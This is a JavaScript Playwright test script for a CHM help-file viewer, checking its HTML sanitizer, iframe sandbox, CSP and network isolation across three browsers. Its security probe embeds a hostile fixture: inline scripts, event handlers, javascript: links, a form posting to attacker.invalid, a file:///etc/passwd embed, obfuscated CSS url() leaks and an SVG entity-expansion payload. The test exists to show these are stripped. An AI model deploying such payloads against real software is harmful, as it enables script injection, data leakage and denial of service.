// BEGIN PREPACK COMPLETION OBSERVATION
import { recordBrowserGateCompletion } from './lib/import-playwright.mjs'
// END PREPACK COMPLETION OBSERVATION
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { pathToFileURL, fileURLToPath } from 'node:url'
import { importPlaywright } from './lib/import-playwright.mjs'
import { startLocalStaticServer } from './lib/local-static-server.mjs'

const scriptDir = dirname(fileURLToPath(import.meta.url))
const sourceRoot = resolve(scriptDir, '../../..')
const demoDist = resolve(process.env.CHM_DEMO_DIST || join(sourceRoot, 'apps/viewer-demo/dist'))
const externalDemoUrl = process.env.CHM_DEMO_SMOKE_URL?.replace(/\/$/, '')
const securityOnly = process.env.CHM_SMOKE_SECURITY_ONLY === '1'
const outputRoot = resolve(process.env.CHM_BROWSER_OUTPUT || join(sourceRoot, 'output/playwright/chm-renderer'))
const sampleName = 'putty-0.85.chm'
const timeout = Number(process.env.CHM_SMOKE_TIMEOUT || 60_000)
const browsers = (process.env.CHM_SMOKE_BROWSERS || 'chromium,firefox,webkit')
  .split(',')
  .map(value => value.trim().toLowerCase())
  .filter(Boolean)
const platformTelemetryHosts = new Set([
  'static.cloudflareinsights.com',
  'cloudflareinsights.com',
])
const harnessRoot = realpathSync(mkdtempSync(join(tmpdir(), 'file-viewer-chm-security-')))
const harnessDist = join(harnessRoot, 'dist')
const securitySource = join(sourceRoot, 'packages/renderers/chm/src/security.ts')

const assert = (condition, message) => {
  if (!condition) throw new Error(`[chm-browser] ${message}`)
}

assert(existsSync(securitySource), `Missing CHM security module ${securitySource}.`)
if (!securityOnly && !externalDemoUrl) {
  assert(existsSync(join(demoDist, 'index.html')), `Missing built Demo at ${demoDist}; run pnpm build-only first.`)
  assert(existsSync(join(demoDist, 'example', sampleName)), `Built Demo is missing example/${sampleName}.`)
}

writeFileSync(join(harnessRoot, 'index.html'), '<!doctype html><html><head><meta charset="utf-8"></head><body><script type="module" src="/main.ts"></script></body></html>')
writeFileSync(join(harnessRoot, 'main.ts'), String.raw`
import { assertChmSvgSourceSafety, sanitizeChmHtmlDocument } from '@file-viewer/chm-security'
Object.defineProperty(window, '__assertChmSvgSourceSafety', { value: assertChmSvgSourceSafety })
Object.defineProperty(window, '__sanitizeChmHtmlDocument', { value: sanitizeChmHtmlDocument })
`)

const viteRequire = createRequire(join(sourceRoot, 'apps/viewer-demo/package.json'))
const viteEntry = viteRequire.resolve('vite')
const { build } = await import(pathToFileURL(viteEntry).href)
await build({
  root: harnessRoot,
  logLevel: 'warn',
  resolve: {
    alias: [{ find: '@file-viewer/chm-security', replacement: securitySource }],
  },
  build: {
    outDir: harnessDist,
    emptyOutDir: true,
    target: 'es2020',
  },
})

const securityServer = await startLocalStaticServer(harnessDist)
const demoServer = securityOnly || externalDemoUrl ? null : await startLocalStaticServer(demoDist)
const demoOrigin = externalDemoUrl || demoServer?.origin || ''
const playwrightModule = await importPlaywright()
const playwright = playwrightModule.chromium ? playwrightModule : playwrightModule.default
const results = []
mkdirSync(outputRoot, { recursive: true })

const launch = async name => {
  const browserType = playwright[name]
  assert(browserType, `Unknown Playwright browser ${name}.`)
  try {
    return await browserType.launch({ headless: true })
  } catch (error) {
    if (name === 'chromium') return browserType.launch({ channel: 'chrome', headless: true })
    throw error
  }
}

const installDeepQuery = async page => page.addInitScript(() => {
  document.addEventListener('file-viewer:chm-ready', event => {
    window.__chmReadyDetail = event.detail
  })
  const collectRoots = () => {
    const roots = [document]
    for (let index = 0; index < roots.length; index += 1) {
      roots[index].querySelectorAll('*').forEach(element => {
        if (element.shadowRoot && !roots.includes(element.shadowRoot)) roots.push(element.shadowRoot)
      })
    }
    return roots
  }
  Object.defineProperties(window, {
    __chmQueryAll: {
      value: selector => collectRoots().flatMap(root => [...root.querySelectorAll(selector)]),
    },
    __chmQuery: {
      value: selector => collectRoots().flatMap(root => [...root.querySelectorAll(selector)])[0] || null,
    },
  })
})

const runSecuritySmoke = async (browser, browserName) => {
  const page = await browser.newPage()
  const errors = []
  page.on('pageerror', error => errors.push(`pageerror: ${error.message}`))
  page.on('console', message => {
    if (message.type() === 'error') errors.push(`console: ${message.text()}`)
  })
  await page.goto(securityServer.origin, { waitUntil: 'networkidle', timeout })
  await page.waitForFunction(() => typeof window.__sanitizeChmHtmlDocument === 'function', null, { timeout })
  const probe = await page.evaluate(() => {
    let svgEntityBlocked = false
    try {
      window.__assertChmSvgSourceSafety('<!DOCTYPE svg [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><svg><text>&b;</text></svg>')
    } catch {
      svgEntityBlocked = true
    }
    const malicious = `<!doctype html><html><head>
      <title>Unsafe topic</title>
      <base href="https://attacker.invalid/">
      <meta http-equiv="refresh" content="0;url=https://attacker.invalid/">
      <link rel="stylesheet" href="theme.css">
      <style>@import url(https://attacker.invalid/import.css);body{background:u\\72l(https://attacker.invalid/leak)}</style>
      </head><body onload="window.__chmPwned=true">
      <script>window.__chmPwned=true</script>
      <template><script>window.__chmPwned=true</script><img src="https://attacker.invalid/template.png"></template>
      <object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><param name="Command" value="ShortCut"></object>
      <embed src="file:///etc/passwd"><iframe src="https://attacker.invalid/frame"></iframe>
      <form action="https://attacker.invalid/collect"><input name="secret"></form>
      <a id="js" href="javascript:alert(1)">bad</a>
      <a id="data-html" href="data:text/html,<script>alert(1)</script>">bad data</a>
      <a id="external" href="https://example.com/docs">external</a>
      <img id="remote" src="https://attacker.invalid/pixel.png">
      <img id="internal" src="../images/logo.png" onerror="window.__chmPwned=true">
      <img id="data-image" src="data:image/png;base64,iVBORw0KGgo=">
      <div style="background-image:url(javascript:alert(1))">style</div>
      <svg><a xlink:href="https://attacker.invalid/svg-link"><text>bad link</text></a><image href="https://attacker.invalid/vector.png"></image><rect fill="u\\72l(https://attacker.invalid/fill.svg)"></rect></svg>
      </body></html>`
    const result = window.__sanitizeChmHtmlDocument(malicious, '/help/topics/start.html')
    const document = new DOMParser().parseFromString(result.html, 'text/html')
    const attributes = [...document.querySelectorAll('*')].flatMap(element =>
      [...element.attributes].map(attribute => ({ name: attribute.name, value: attribute.value })))
    const resourceUrls = attributes
      .filter(attribute => ['src', 'srcset', 'poster', 'action', 'background'].includes(attribute.name))
      .map(attribute => attribute.value)
    return {
      activeElements: document.querySelectorAll('script,object,embed,applet,iframe,frame,frameset,form,input,button,textarea,select,base,template').length,
      csp: document.querySelector('meta[http-equiv="Content-Security-Policy" i]')?.getAttribute('content') || '',
      dangerousAttributes: attributes.filter(attribute =>
        attribute.name.startsWith('on') ||
        /(?:javascript|vbscript|file):/i.test(attribute.value) ||
        /url\s*\(\s*(?:["']?)(?:javascript:|https?:\/\/)/i.test(attribute.value)),
      hasRefresh: Boolean(document.querySelector('meta[http-equiv="refresh" i]')),
      remoteResources: resourceUrls.filter(value => /^https?:/i.test(value)),
      retainedRemoteText: /attacker\.invalid/i.test(document.documentElement.outerHTML),
      resourcePaths: result.resourcePaths,
      svgEntityBlocked,
      title: result.title,
      pwned: Boolean(window.__chmPwned),
    }
  })
  assert(probe.title === 'Unsafe topic', `${browserName}: sanitizer lost the topic title: ${JSON.stringify(probe)}.`)
  assert(probe.svgEntityBlocked, `${browserName}: SVG entity declarations passed the pre-DOMParser guard.`)
  assert(probe.activeElements === 0, `${browserName}: sanitizer retained active CHM elements: ${JSON.stringify(probe)}.`)
  assert(!probe.hasRefresh, `${browserName}: sanitizer retained meta refresh.`)
  assert(probe.dangerousAttributes.length === 0, `${browserName}: sanitizer retained active attributes: ${JSON.stringify(probe)}.`)
  assert(probe.remoteResources.length === 0, `${browserName}: sanitizer retained automatic remote resources: ${JSON.stringify(probe)}.`)
  assert(!probe.retainedRemoteText, `${browserName}: sanitizer retained an obfuscated remote reference: ${JSON.stringify(probe)}.`)
  assert(!probe.pwned, `${browserName}: malicious CHM script executed.`)
  assert(probe.csp.includes("default-src 'none'"), `${browserName}: sanitized topic lacks deny-by-default CSP: ${JSON.stringify(probe)}.`)
  assert(probe.resourcePaths.includes('/help/images/logo.png'), `${browserName}: safe internal resource was not normalized: ${JSON.stringify(probe)}.`)
  assert(errors.length === 0, `${browserName}: sanitizer harness errors:\n${errors.join('\n')}`)
  await page.close()
  return probe
}

const runDemoSmoke = async (browser, browserName) => {
  const page = await browser.newPage({ viewport: { width: 1440, height: 960 } })
  const errors = []
  const requests = []
  const responseFailures = []
  const responses = []
  await installDeepQuery(page)
  page.on('request', request => requests.push(request.url()))
  page.on('requestfailed', request => errors.push(`requestfailed: ${request.url()} ${request.failure()?.errorText || ''}`))
  page.on('response', response => {
    responses.push({
      contentType: response.headers()['content-type'] || '',
      status: response.status(),
      url: response.url(),
    })
    if (response.status() >= 400) responseFailures.push(`${response.status()} ${response.url()}`)
  })
  page.on('pageerror', error => errors.push(`pageerror: ${error.message}`))
  page.on('console', message => {
    if (message.type() === 'error') errors.push(`console: ${message.text()}`)
  })

  const url = new URL(`${demoOrigin}/index.html`)
  url.searchParams.set('url', `/example/${sampleName}`)
  url.searchParams.set('smoke', 'chm-rust-wasm')
  await page.goto(url.href, { waitUntil: 'domcontentloaded', timeout })
  await page.waitForFunction(() => window.__chmQuery('.chm-viewer')?.dataset.chmReady === 'true', null, { timeout })
  await page.waitForFunction(() => {
    const document = window.__chmQuery('.chm-topic-frame')?.contentDocument
    return (document?.body?.innerText || '').trim().length > 100 &&
      Boolean(document?.querySelector('meta[http-equiv="Content-Security-Policy" i]'))
  }, null, { timeout })

  const initial = await page.evaluate(() => {
    const root = window.__chmQuery('.chm-viewer')
    const frame = window.__chmQuery('.chm-topic-frame')
    const document = frame?.contentDocument
    const navigation = window.__chmQueryAll('.chm-navigation [data-chm-path]')
    const active = window.__chmQuery('.chm-navigation .is-active[data-chm-path]')
    const attributes = document
      ? [...document.querySelectorAll('*')].flatMap(element => [...element.attributes])
      : []
    return {
      activePath: active?.getAttribute('data-chm-path') || '',
      activeElements: document?.querySelectorAll('script,object,embed,applet,iframe,form,input,button,textarea,select,base').length ?? -1,
      csp: document?.querySelector('meta[http-equiv="Content-Security-Policy" i]')?.getAttribute('content') || '',
      dangerousAttributes: attributes.filter(attribute =>
        attribute.name.toLowerCase().startsWith('on') || /^(?:javascript|vbscript|file):/i.test(attribute.value)).length,
      frameText: (document?.body?.innerText || '').replace(/\s+/g, ' ').trim().slice(0, 500),
      hasError: Boolean(window.__chmQuery('.chm-error')),
      navigationCount: navigation.length,
      readyDetail: window.__chmReadyDetail || null,
      rootReady: root?.dataset.chmReady,
      sandbox: frame?.getAttribute('sandbox') || '',
    }
  })
  assert(initial.rootReady === 'true', `${browserName}: CHM root did not reach ready state.`)
  assert(initial.readyDetail?.topicCount > 20 && initial.readyDetail?.homePath, `${browserName}: CHM ready event lacks manifest evidence: ${JSON.stringify(initial)}.`)
  assert(initial.navigationCount > 20, `${browserName}: real PuTTY CHM exposed only ${initial.navigationCount} navigation topics.`)
  assert(/PuTTY/i.test(initial.frameText), `${browserName}: home topic has no PuTTY content: ${JSON.stringify(initial)}.`)
  assert(!initial.hasError, `${browserName}: CHM error state remained visible.`)
  assert(initial.activeElements === 0 && initial.dangerousAttributes === 0, `${browserName}: rendered topic retained active content: ${JSON.stringify(initial)}.`)
  assert(initial.csp.includes("default-src 'none'"), `${browserName}: rendered topic lacks deny-by-default CSP: ${JSON.stringify(initial)}.`)
  assert(initial.sandbox.split(/\s+/).includes('allow-same-origin'), `${browserName}: topic iframe cannot resolve local blob resources.`)
  assert(!initial.sandbox.split(/\s+/).includes('allow-scripts'), `${browserName}: topic iframe permits scripts.`)

  const navigationTarget = await page.evaluate(() => {
    const active = window.__chmQuery('.chm-navigation .is-active[data-chm-path]')?.getAttribute('data-chm-path')
    const candidate = window.__chmQueryAll('.chm-navigation [data-chm-path]')
      .find(element => element.getAttribute('data-chm-path') && element.getAttribute('data-chm-path') !== active)
    const path = candidate?.getAttribute('data-chm-path') || ''
    candidate?.click()
    return path
  })
  assert(navigationTarget, `${browserName}: no second CHM topic was available for navigation.`)
  await page.waitForFunction(path =>
    window.__chmQuery('.chm-navigation .is-active[data-chm-path]')?.getAttribute('data-chm-path') === path,
  navigationTarget, { timeout })

  const searchTab = await page.evaluate(() => {
    const button = window.__chmQuery('[data-chm-tab="search"]')
    if (!(button instanceof HTMLElement)) return false
    button.click()
    return true
  })
  assert(searchTab, `${browserName}: CHM search tab is missing.`)
  await page.waitForFunction(() => !window.__chmQuery('[data-chm-panel="search"]')?.hidden, null, { timeout })
  const searchInput = await page.evaluate(() => {
    const input = window.__chmQuery('.chm-search input')
    if (!(input instanceof HTMLInputElement)) return false
    input.value = 'licence'
    input.dispatchEvent(new Event('input', { bubbles: true }))
    input.dispatchEvent(new Event('change', { bubbles: true }))
    return true
  })
  assert(searchInput, `${browserName}: CHM search input is missing.`)
  await page.waitForFunction(() => window.__chmQueryAll('[data-chm-search-result]').length > 0, null, { timeout })
  const searchResultCount = await page.evaluate(() => window.__chmQueryAll('[data-chm-search-result]').length)

  // Firefox does not consistently surface module fetches performed inside a
  // module Worker through the owning Page's request events. Probe the emitted
  // wasm-bindgen glue directly while the ready event and WASM request below
  // still prove that the Worker initialized the actual parser runtime.
  const wasmModuleProbe = await page.evaluate(async () => {
    const response = await fetch('/vendor/chm/chm_wasm.js', { cache: 'no-store' })
    const source = await response.text()
    return {
      contentType: response.headers.get('content-type') || '',
      hasArchiveApi: /\bChmArchive\b/.test(source),
      status: response.status,
    }
  })
  assert(wasmModuleProbe.status === 200, `${browserName}: wasm-bindgen CHM module returned HTTP ${wasmModuleProbe.status}.`)
  assert(/(?:java|ecma)script/i.test(wasmModuleProbe.contentType), `${browserName}: wasm-bindgen CHM module has an invalid MIME type: ${JSON.stringify(wasmModuleProbe)}.`)
  assert(wasmModuleProbe.hasArchiveApi, `${browserName}: wasm-bindgen CHM module does not expose ChmArchive: ${JSON.stringify(wasmModuleProbe)}.`)

  const requestPaths = requests.flatMap(requestUrl => {
    try { return [new URL(requestUrl).pathname] } catch { return [] }
  })
  assert(requestPaths.some(path => /chm(?:[._-].*)?worker.*\.js$/i.test(path)), `${browserName}: no CHM Worker asset was requested: ${JSON.stringify(requestPaths)}.`)
  assert(requestPaths.some(path => /chm_wasm.*\.wasm$/i.test(path)), `${browserName}: no CHM WebAssembly binary was requested: ${JSON.stringify(requestPaths)}.`)
  const wasmResponses = responses.filter(response => /chm_wasm.*\.wasm(?:$|\?)/i.test(response.url))
  assert(wasmResponses.some(response => response.status === 200 && response.contentType.toLowerCase().startsWith('application/wasm')), `${browserName}: CHM WASM did not return HTTP 200 application/wasm: ${JSON.stringify(wasmResponses)}.`)

  const targetOrigin = new URL(demoOrigin).origin
  const externalRequests = requests.filter(requestUrl => {
    if (/^(?:blob|data):/i.test(requestUrl)) return false
    try {
      const url = new URL(requestUrl)
      return url.origin !== targetOrigin && !platformTelemetryHosts.has(url.hostname)
    } catch {
      return true
    }
  })
  assert(externalRequests.length === 0, `${browserName}: CHM preview issued external requests: ${JSON.stringify(externalRequests)}.`)
  assert(responseFailures.length === 0, `${browserName}: CHM preview received failed responses: ${responseFailures.join('\n')}`)
  assert(errors.length === 0, `${browserName}: CHM Demo browser errors:\n${errors.join('\n')}`)
  await page.screenshot({ path: join(outputRoot, `${browserName}.png`), fullPage: true })

  await page.setViewportSize({ width: 390, height: 844 })
  const mobileToggle = await page.evaluate(() => {
    const button = window.__chmQuery('.chm-sidebar-toggle')
    if (!(button instanceof HTMLButtonElement) || getComputedStyle(button).display === 'none') return false
    button.click()
    return true
  })
  assert(mobileToggle, `${browserName}: responsive CHM sidebar toggle is unavailable.`)
  await page.waitForFunction(() => {
    const root = window.__chmQuery('.chm-viewer')
    const sidebar = window.__chmQuery('.chm-sidebar')
    return root?.classList.contains('is-sidebar-open')
      && sidebar instanceof HTMLElement
      && sidebar.getBoundingClientRect().left >= -1
  }, null, { timeout })
  await page.screenshot({ path: join(outputRoot, `${browserName}-mobile.png`), fullPage: true })
  await page.close()
  return {
    ...initial,
    navigatedPath: navigationTarget,
    requests: requests.length,
    searchResultCount,
    mobileSidebar: true,
  }
}

try {
  for (const browserName of browsers) {
    const browser = await launch(browserName)
    try {
      results.push({
        browser: browserName,
        security: await runSecuritySmoke(browser, browserName),
        demo: securityOnly ? null : await runDemoSmoke(browser, browserName),
      })
      // BEGIN PREPACK COMPLETION OBSERVATION
      await recordBrowserGateCompletion({ gateId: 'chm-renderer', engine: browserName, phase: securityOnly ? 'security-only' : 'full',
        caseIds: results.at(-1).demo ? ['security', 'reader'] : ['security'], fixtures: [sampleName], summary: { securityOnly, readerParticipated: !!results.at(-1).demo } })
      // END PREPACK COMPLETION OBSERVATION
    } finally {
      await browser.close()
    }
  }
} finally {
  await securityServer.close()
  await demoServer?.close()
  rmSync(harnessRoot, { recursive: true, force: true })
}

console.log(JSON.stringify({
  demo: demoOrigin,
  fixture: sampleName,
  browsers: results,
}, null, 2))
